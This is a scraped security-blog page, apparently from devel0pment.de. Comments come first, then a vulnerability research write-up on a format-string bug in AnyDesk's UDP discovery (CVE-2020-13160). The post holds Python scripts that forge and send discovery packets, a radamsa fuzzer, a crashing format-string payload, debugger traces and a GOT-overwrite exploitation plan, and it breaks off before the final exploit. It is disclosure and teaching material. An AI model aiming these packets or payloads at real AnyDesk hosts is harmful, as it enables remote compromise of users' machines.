3. ![](https://secure.gravatar.com/avatar/f2dbf914b04cd46b9b19fe0f11837221?s=100&d=mm&r=g)
   [11. December 2020 at 5:23 pm](https://devel0pment.de/?p=1881#comment-2645)

   the most difficult part is search 2 stack that reliable for format string argument …

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [12. December 2020 at 5:32 pm](https://devel0pment.de/?p=1881#comment-2647)

      Yes, in this case the stack varies when the format string vulnerability is triggered either by the username or by the hostname. You can increase the reliability by simply using values more down on the stack, as these values are more likely to stay the same between both calls.
5. ![](https://secure.gravatar.com/avatar/b576ed7219c952b200df2dbea3d1349f?s=100&d=mm&r=g)
   [25. March 2021 at 5:25 pm](https://devel0pment.de/?p=1881#comment-2935)

   What a nice piece of analysis. I’ve added this as a CTF target in one of my courses. The exploit seems rock solid on 18.04.4.

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [25. March 2021 at 5:41 pm](https://devel0pment.de/?p=1881#comment-2936)

      Thanks 🙂
7. ![](https://secure.gravatar.com/avatar/b7bd7975a28f65030a10b547eff24eca?s=100&d=mm&r=g)
   [26. March 2022 at 8:37 pm](https://devel0pment.de/?p=1881#comment-3704)

   it’s also stable on 18.04.6
9. ![](https://secure.gravatar.com/avatar/47ceb849cbd1957491ae35c4074e5311?s=100&d=mm&r=g) **[m3dsec](https://m3dsec.github.io/)** says:
   [6. April 2023 at 2:23 pm](https://devel0pment.de/?p=1881#comment-4173)

   Good job, reading this in 2023, and it rocks.

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g) **scryh** says:
      [6. April 2023 at 2:33 pm](https://devel0pment.de/?p=1881#comment-4174)

      Thank you!

Comments are closed.

## Post navigation

[Previous PostPrevious   Hack The Box – Rope](https://devel0pment.de/?p=1593)[Next PostNext ALLES! CTF 2020 – Actual ASLR 1/2](https://devel0pment.de/?p=2027)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from devel0pment.de_167b26b3_20250119_142606.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881) by [scryh](https://devel0pment.de/?author=1)
# AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

---

# Fuzzing

The AnyDesk application is running multiple processes with different permissions. The most valuable target is the service process `/usr/bin/anydesk --service`, since this process is running with `root` privileges. There are two older CVEs ([CVE-2017-14397](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14397) and [CVE-2018-13102](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13102)), which target this process on Windows in order to escalate privileges. Both of these exploits are DLL injection/preloading vulnerabilities, which only work locally. My desire was to find a vulnerability, which can be exploited remotely.

At first we need to figure out which remote communication with the AnyDesk application is possible. This can simply be done by starting the application and using `netstat` to determine on which ports the application is listening:

```

user@w00d:~$ sudo netstat -tulpn | grep anydesk
tcp        0      0 0.0.0.0:7070            0.0.0.0:*               LISTEN      598/anydesk
udp        0      0 0.0.0.0:50001           0.0.0.0:*                           598/anydesk

```

Accordingly the application is listening on TCP port `7070` and UDP port `50001`. By displaying all anydesk processes, we can see that the listening process is the service process itself (PID `598`). Also recognize the traybar process (PID `2983`) as well as the front-end process (PID `3421`):

```

user@w00d:~$ sudo ps aux | grep anydesk
root       598  0.0  0.3 531172 28620 ?        Ssl  08:56   0:02 /usr/bin/anydesk --service
user      2983  0.0  0.2 744288 23736 tty2     Sl+  08:58   0:00 /usr/bin/anydesk --tray
user      3421  0.0  0.4 864624 37760 tty2     Sl+  09:01   0:00 /usr/bin/anydesk

```

Before we can reasonably fuzz the application, we have to determine what data the application is usually expecting to receive on these ports. In order to get some sample data, we can inspect all traffic related to these ports using `wireshark` while interacting with the application.

According to the observations we can make with wireshark TCP port 7070 is used for the actual remote desktop connection and uses TLS to encrypt the traffic. The details are not relevant for our considerations here. The relevant port is UDP 50001, which is used to announce AnyDesk clients within a local network. On startup of AnyDesk we can see that our client sends UDP packets to `239.255.102.18` in order to announce its presence. The packet contains the hostname (`w00d`), the username (`scryh`), a profile picture as well as a few other information:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_01.png)

Assuming that these announcements are also processed by our own client, we now have some legitimate data in order to fuzz the application. At first I started by fuzzing the application using [fuzzotron](https://github.com/denandz/fuzzotron), which is written in C and is quite fast. fuzzotron uses [radamsa](https://gitlab.com/akihe/radamsa) and/or [blab](https://github.com/aoh/blab) for the mutation of the input data. The setup is straightforward. We simply put our initial data observed in wireshark in a test-case file and then run fuzzotron providing among others the IP address and port as well as the PID, which fuzzotron should monitor for possible crashes.

Unfortunately I could not find any flaws that seemed to be exploitable. So I decided to change the approach. Instead of directly targeting the service process, which is listening on the network socket, we can focus on the front-end process (PID `2983` in the output above). The front-end process is responsible for displaying the GUI to the user and communicates with the service process to exchange information relevant for the GUI. When the service process receives a valid UDP announcement frame this frame is passed to the front-end process in order to display the announced device within the GUI:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_02.png)

To make our fuzzing input reach the front-end process we have to send valid announcement frames. The problem here is that most of the frames produced by the fuzzer we used so far are not valid, because there are mutated without any knowledge of the specific format of these frames. Accordingly most of the fuzzer-mutated frames are dropped by the service process and never reach the front-end process.

In order to create valid announcement frames we have to understand how the frames are built. Fortunately the format is not very complicated. By changing settings like our username or hostname and then observing the corresponding announcement frames our client is sending, we can derive how the frames are built. Among other things a frame contains the AnyDesk ID (4-byte), an operating system ID (1-byte) as well as the hostname and username, which are both transmitted as a 4-byte length field (`big-endian`) followed by the actual data. There are a few other fields and static values, which are not relevant for our considerations. The following python script creates a valid frame based on the given parameters and sends it to our local machine on UDP port 50001:

```

#!/usr/bin/env python

import struct
import socket

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

p = gen_discover_packet(4919, 1, 'custom host', 'custom username', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

After running the script we can see in the GUI that the front-end received the announcement and the fake device is displayed:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_03.png)

Now we are ready to explicitly fuzz certain fields of the frame. In order to do this we extend the python script to serve as our fuzzer. We can generate the actual fuzzing input by using radamsa again. Also we will monitor the front-end process and dump the last 10 fuzzing inputs, if the process died. The full fuzzer script, which targets the hostname, looks like this:

```

#!/usr/bin/env python

import struct
import socket
import subprocess
import psutil
import os
import time

ip = '127.0.0.1'
port = 50001
host_payloads = [''] * 10
dump_idx = 0

def mutate(pl):
  p = subprocess.Popen(['/usr/bin/radamsa', '-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
  return p.communicate(pl)[0]

def isAlive():
  for p in psutil.process_iter():
    if (p.name() == 'anydesk' and len(p.cmdline()) == 1): return True
  return False

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

def dump():
  global dump_idx
  print('dumping '+str(dump_idx))
  os.system('mkdir loot'+str(dump_idx))
  for i in range(len(host_payloads)):
    f = open('./loot'+str(dump_idx)+'/host_payload'+str(i), 'wb')
    f.write(host_payloads[i])
    f.close()
  dump_idx += 1
  os.system('anydesk&')
  time.sleep(5)

idx = 0
while True:
  time.sleep(5.0)
  host = mutate('host')
  if (len(host) > 45000): continue # max length
  host_payloads[idx%len(host_payloads)] = host
  p = gen_discover_packet(4919, 2, host, 'user', 'ad', 'main')
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.sendto(p, (ip, port))
  s.close()
  idx += 1
  if (not isAlive()): dump()

```

The sleep time for each fuzzing iteration is quite high (5 seconds), but it turned out that the GUI is only updated every 5 seconds. At first I thought about patching the binary in order to increase the update interval, but before digging into this I decided to just let the fuzzer run over a night.

At the next day the fuzzing results were ready to be evaluated. The front-end actually crashed a few times and the script stored the fuzzing inputs on disk. At first we need to determine which exact payload triggered the crash. Since we saved the last 10 payloads sent to the application, we just need to resend these payloads and determine which one makes the application crash. This can be done using the following script:

```

#!/usr/bin/env python

import struct
import socket
import sys

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  ...

host = open(sys.argv[1]).read()
p = gen_discover_packet(4919, 2, host, 'user', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

By sending the following payload the front-end crashes:

```

user@w00d:~$ ./resend.py loot2/host_payload4

... crash ...

user@w00d:~$ hexdump -C loot2/host_payload4
00000000  61 61 61 61 25 64 25 6e  25 70 25 64 24 2b f3 a0  |aaaa%d%n%p%d$+..|
00000010  81 9c 81 bd 0b 7c                                 |.....||
00000016

```

By fuzzing the AnyDesk front-end process with a python script, which produces valid announcement frames and mutates the hostname using radamsa, we successfully generated an input, which crashes the application. The next step is to analyze the bug in order the determine, if we can exploit it.

# Bug

So far we have fuzzed the AnyDesk front-end and identified an input which makes the front-end crash. The next step is to determine what the cause of this crash is and to examine if it is based on a bug which we can exploit.

At first we start up the front-end again and attach gdb to it (the `pid_frontend.py` script merely retrieves the current `PID` of the front-end process):

```

root@w00d:~# gdb /usr/bin/anydesk $(~/pid_frontend.py)

...
Reading symbols from /usr/bin/anydesk...(no debugging symbols found)...done.
Attaching to program: /usr/bin/anydesk, process 10911
[New LWP 10913]
[New LWP 10914]
[New LWP 10928]
[New LWP 10931]
[New LWP 10938]
[New LWP 10941]
[New LWP 10942]
[New LWP 10943]
[New LWP 10944]
[New LWP 10945]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

[----------------------------------registers-----------------------------------]
RAX: 0xfffffffffffffdfc
RBX: 0x1cf7720 --> 0x100000005
RCX: 0x7f491870ebf9 (<__GI___poll+73>:	cmp    rax,0xfffffffffffff000)
RDX: 0x37a0
RSI: 0x3
RDI: 0x1cf7720 --> 0x100000005
RBP: 0x3
RSP: 0x7ffe12cbcfb0 --> 0x1aa05cc --> 0x2
RIP: 0x7f491870ebf9 (<__GI___poll+73>:	cmp    rax,0xfffffffffffff000)
R8 : 0x0
R9 : 0x1ab6720 --> 0x1900000024
R10: 0x1ce3000 --> 0x1ab6720 --> 0x1900000024
R11: 0x293
R12: 0x37a0
R13: 0x37a0
R14: 0x7f491d0b9f70 (<g_poll>:	mov    esi,esi)
R15: 0x3
EFLAGS: 0x293 (CARRY parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f491870ebef <__GI___poll+63>:	mov    rdi,rbx
   0x7f491870ebf2 <__GI___poll+66>:	mov    eax,0x7
   0x7f491870ebf7 <__GI___poll+71>:	syscall
=> 0x7f491870ebf9 <__GI___poll+73>:	cmp    rax,0xfffffffffffff000
   0x7f491870ebff <__GI___poll+79>:	ja     0x7f491870ec32 <__GI___poll+130>
   0x7f491870ec01 <__GI___poll+81>:	mov    edi,r8d
   0x7f491870ec04 <__GI___poll+84>:	mov    DWORD PTR [rsp+0xc],eax
   0x7f491870ec08 <__GI___poll+88>:	call   0x7f491872a740 <__libc_disable_asynccancel>
[------------------------------------stack-------------------------------------]
0000| 0x7ffe12cbcfb0 --> 0x1aa05cc --> 0x2
0008| 0x7ffe12cbcfb8 --> 0x1cf7720 --> 0x100000005
0016| 0x7ffe12cbcfc0 --> 0x1957be0 --> 0x0
0024| 0x7ffe12cbcfc8 --> 0x3
0032| 0x7ffe12cbcfd0 --> 0x1cf7720 --> 0x100000005
0040| 0x7ffe12cbcfd8 --> 0x7f491d0aa5c9 (mov    r13d,eax)
0048| 0x7ffe12cbcfe0 --> 0x0
0056| 0x7ffe12cbcfe8 --> 0x101957be0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00007f491870ebf9 in __GI___poll (fds=0x1cf7720, nfds=0x3, timeout=0x37a0) at ../sysdeps/unix/sysv/linux/poll.c:29
29	../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
gdb-peda$ c
Continuing.

```

Now we resend the payload, which caused the crash:

```

user@w00d:~$ ./resend.py loot2/host_payload4

```

As expected the application raises a segmentation fault:

```

Thread 1 "anydesk" received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x7ffe12cbb800 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
RCX: 0x0
RDX: 0x7ffe12cbc4f8 --> 0x0
RSI: 0x7ffe12cbb568 --> 0xd24f18983b49a900
RDI: 0x7ffe12cbb5b0 --> 0x7ffefbad8001
RBP: 0x7ffe12cbb5a0 --> 0x7ffe12cbbc00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa30849456\275\313\022\376\177")
RSP: 0x7ffe12cbb030 --> 0x7f491ec3a6f0 (<gtk_widget_destroy>:	push   rbx)
RIP: 0x7f4918657932 (<_IO_vfprintf_internal+9634>:	mov    DWORD PTR [rax],r13d)
R8 : 0x0
R9 : 0x0
R10: 0x0
R11: 0x7ffe12cbb88c --> 0xf32b24642570256e
R12: 0x7ffe12cbc4c8 --> 0x3000000020 (' ')
R13: 0x91
R14: 0x7ffe12cbb5b0 --> 0x7ffefbad8001
R15: 0x6e ('n')
EFLAGS: 0x10212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f4918657928 <_IO_vfprintf_internal+9624>:	add    eax,0x8
   0x7f491865792b <_IO_vfprintf_internal+9627>:	mov    DWORD PTR [r12],eax
   0x7f491865792f <_IO_vfprintf_internal+9631>:	mov    rax,QWORD PTR [rdx]
=> 0x7f4918657932 <_IO_vfprintf_internal+9634>:	mov    DWORD PTR [rax],r13d
   0x7f4918657935 <_IO_vfprintf_internal+9637>:	jmp    0x7f4918655930 <_IO_vfprintf_internal+1440>
   0x7f491865793a <_IO_vfprintf_internal+9642>:	mov    QWORD PTR [rbp-0x4e8],r11
   0x7f4918657941 <_IO_vfprintf_internal+9649>:	mov    QWORD PTR [rbp-0x4e0],rax
   0x7f4918657948 <_IO_vfprintf_internal+9656>:	call   0x7f4918684150 <_IO_vtable_check>
[------------------------------------stack-------------------------------------]
0000| 0x7ffe12cbb030 --> 0x7f491ec3a6f0 (<gtk_widget_destroy>:	push   rbx)
0008| 0x7ffe12cbb038 --> 0x0
0016| 0x7ffe12cbb040 --> 0x7ffe12cbb88a ("d%n%p%d$+\201\275\v|'")
0024| 0x7ffe12cbb048 --> 0x7ffe00000000
0032| 0x7ffe12cbb050 --> 0x0
0040| 0x7ffe12cbb058 --> 0x1
0048| 0x7ffe12cbb060 --> 0xffffffffffffffff
0056| 0x7ffe12cbb068 --> 0x100000000
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007f4918657932 in _IO_vfprintf_internal (s=s@entry=0x7ffe12cbb5b0,
    format=format@entry=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", ap=ap@entry=0x7ffe12cbc4c8) at vfprintf.c:1642
1642	vfprintf.c: No such file or directory.

```

As we can see, the crash is caused by the instruction `mov DWORD PTR [rax], r13d` within the function `_IO_vfprintf_internal`. Since the value of `rax` is `0` a segmentation fault is raised. Using the command `bt` we can print the stacktrace:

```

gdb-peda$ bt
#0  0x00007f4918657932 in _IO_vfprintf_internal (s=s@entry=0x7ffe12cbb5b0,
    format=format@entry=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", ap=ap@entry=0x7ffe12cbc4c8) at vfprintf.c:1642
#1  0x00007f4918682910 in _IO_vsnprintf (
    string=0x7ffe12cbbc00 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa30849456\275\313\022\376\177", maxlen=<optimized out>,
    format=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", args=0x7ffe12cbc4c8) at vsnprintf.c:114
#2  0x00000000008ab34b in ?? ()
#3  0x00000000008aba98 in ?? ()
#4  0x0000000000434395 in ?? ()
#5  0x00007f491d0b11cd in g_logv () from /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
#6  0x00007f491d0b133f in g_log () from /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
...

```

According to the output the return address after the `vsnprintf` call is `0x8ab34b` (`#2`). Let’s examine the code at this address in `ghidra`:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_04.png)

The call to `vsnprintf` is at `0x8ab346`. The third parameter of the function is the format string to be used (`local_cb8`). A few lines before we can see that the fourth parameter of the outer function (`param_4`) is copied into `local_cb8` using `strncpy`. In order to determine which parameters were passed to `vsnprintf` let’s set a breakpoint on the call and resend the payload:

```

gdb-peda$ b *0x8ab346
Breakpoint 1 at 0x8ab346
gdb-peda$ c
Continuing.

```

```

user@w00d:~$ ./resend.py loot2/host_payload4

```

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffec15e4248 --> 0x3000000010
RDX: 0x7ffec15e3580 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
RSI: 0x400
RDI: 0x7ffec15e3980 --> 0x7
RBP: 0x5
RSP: 0x7ffec15e34a0 --> 0x7ffec15e3670 --> 0x0
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffffa0
R11: 0x7fb9b72f9550 --> 0xfff08320fff08310
R12: 0x7ffec15e4248 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x2475ec0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffec15e3980 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffec15e3580 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
arg[3]: 0x7ffec15e4248 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffec15e34a0 --> 0x7ffec15e3670 --> 0x0
0008| 0x7ffec15e34a8 --> 0x7ffec15e3600 ("lid 'aaaa%d%n%p%d$+\201\275\v|'")
0016| 0x7ffec15e34b0 --> 0x25ed450 --> 0x0
0024| 0x7ffec15e34b8 --> 0x7ffec15e3600 ("lid 'aaaa%d%n%p%d$+\201\275\v|'")
0032| 0x7ffec15e34c0 --> 0x7ffec15e3820 --> 0x0
0040| 0x7ffec15e34c8 --> 0x7fb9bbbe89d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffec15e34d0 --> 0x23e8230 --> 0x2253ab0 --> 0x2244340 --> 0x31 ('1')
0056| 0x7ffec15e34d8 --> 0x2622e60 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()

```

We hit the breakpoint on the call to `vsnprintf`. The third parameter (`RDX`) contains the format string. The passed string obviously contains an error message about an invalid UTF-8 encoded text. But this string does also contain the string, which caused the error: `'aaaa%d%n%p%d$+\201\275\v|'`. This is our fuzzing input! In the format string! We have found a format string vulnerability.

In this case the actual crash of the application was caused by the `%n` format specifier within the fuzzer-generated data. The `%n` format specifier can be used to write data. The address, where the data in this case is supposed to be written, happened to be null. This caused the segmentation fault.

Analyzing the code a little bit further we can determine that the call to `vsnprintf` prepares a string, which will be written to the log file (`~/.anydesk/anydesk.trace`). The fourth parameter of the outer function, which will be used as the format string, is in this case an error message generated by the `glib` library, which is raised because the text contains an invalid UTF-8 sequence. This error message was obviously assumed to be static. However the error message contains the input, which caused the error (the fuzzed hostname), which we can control. Thus we can control parts of the format string by inserting an invalid UTF-8 sequence into the hostname of an announcement frame. This results in a classical format string vulnerability.

Also it turned out that the vulnerable call is actually made twice. By sending an announcement frame with an invalid UTF-8 sequence and a format specifier (`'\x85\xfeTEST %p'`), we can see the result in `~/.anydesk/anydesk.trace`:

```

user@w00d:~$ tail -n 3 ~/.anydesk/anydesk.trace
warning 2020-05-25 08:59:02.119   frontend   main   4431   4431                                  glib - Failed to set text from markup due to error parsing markup: Error on line 1 char 43: Invalid UTF-8 encoded text in name - not valid '??TEST 0x15334e0'
warning 2020-05-25 08:59:02.125   frontend   main   4431   4431                                  glib - Failed to set text from markup due to error parsing markup: Error on line 1 char 43: Invalid UTF-8 encoded text in name - not valid '??TEST 0x15334e0'
   info 2020-05-25 08:59:02.132   frontend   main   4431   4431                     unix_app.frontend - Monitoring online states.

```

The error message has been written twice to the log file. We can also see how the inserted format specifier (`%p`) has been evaluated.

After analyzing the segmentation fault discovered by fuzzing the front-end process, we identified that the cause of the crash is a format string vulnerability. The next step is to develop an exploit for the identified vulnerability.

# Exploit

Within my writeup on [RPISEC/MBE lab04B](https://devel0pment.de/?p=351#lab4B) I described the basics on how to exploit a format string vulnerability using the `%n` format specifier. This format specifier can be used to write data and also caused the segmentation fault when fuzzing the application. Within this section we will take a look at how to exploit the format string vulnerability in this very specific setting in order to gain Remote Code Execution (RCE).

## Strategy

Probably the very first thing everyone does when facing a binary exploitation challenge is to check which security mechanisms are enabled. In this case the result is very surprising:

```

user@w00d:~$ checksec /usr/bin/anydesk
[*] '/usr/bin/anydesk'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

```

Actually no protection mechanisms are enabled, which makes the exploitation more easy.

While developing an exploit I would generally suggest to disable ASLR and just keep in mind that we have to bypass it. This makes it easier to compare addresses of multiple runs of the application:

```

user@w00d:~$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0

```

The first goal we need to achieve is to control the instruction pointer. Since there is `No RELRO`, we can use the `%n` format specifier to overwrite an entry within the `Global Offset Table` (`GOT`). As the heap segment, where our input data will be stored, is actually executable, we can store a shellcode there and make the `GOT` entry point to this shellcode. On the next call of the function, which `GOT` entry we overwrote, our shellcode is executed.

Although these steps sound quite straight forward, achieving this turned out to be a little bit more challenging. Let’s have a look.

## The v in vsnprintf

The next instruction after the vulnerable call to `vsnprintf` is a call to the function `time`. Accordingly we can overwrite the `GOT` entry of `time` and thus redirecting the control flow immediately after the `vsnprintf` call. In order to use the `%n` format specifier to overwrite the `GOT` entry of `time`, we need to be able to reference the address of the `GOT` entry. In a classical format string exploit this is achieved by being able to control data on the stack. Since all values on the stack, which are equal or below to the current `RSP`, can be referenced with an appropriate argument selector (e.g. `%35$n`), the desired address can simply be put into the controlled stack data. Using the appropriate argument selector in combination with the `%n` format specifier causes the function to write the amount of characters written so far to this address.

In this case things are a little bit different. As you probably already noticed the vulnerable call is **not** made to the function `snprintf`, which signature looks like this:

```

snprintf(char *s, size_t n, const char *format, ...)

```

…, but rather `vsnprintf`, which signature looks like this:

```

vsnprintf(char *s, size_t n, const char *format, va_list arg)

```

The difference here is that the format string arguments are not directly passed as variable arguments (`...`), but within a `va_list` parameter (`arg`). Each of the functions in the printf family has a corresponding `va_list` function beginning with the letter `v`:

```

user@w00d:~$ man 3 printf
...

       #include <stdio.h>

       int printf(const char *format, ...);
       int fprintf(FILE *stream, const char *format, ...);
       int dprintf(int fd, const char *format, ...);
       int sprintf(char *str, const char *format, ...);
